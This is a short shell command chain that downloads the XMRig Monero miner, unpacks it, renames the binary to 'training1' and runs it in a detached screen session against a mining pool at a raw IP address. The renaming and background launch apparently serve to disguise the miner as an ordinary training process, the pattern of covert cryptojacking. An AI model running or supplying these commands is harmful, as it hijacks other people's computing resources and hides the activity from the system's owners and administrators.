wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz &&
tar -xzvf xmrig-6.21.3-linux-static-x64.tar.gz &&
cd xmrig-6.21.3/ &&
mv xmrig training1 -n &&
screen ./training1 -o 88.99.74.228:3333 -a rx/0 -k --donate-level 1
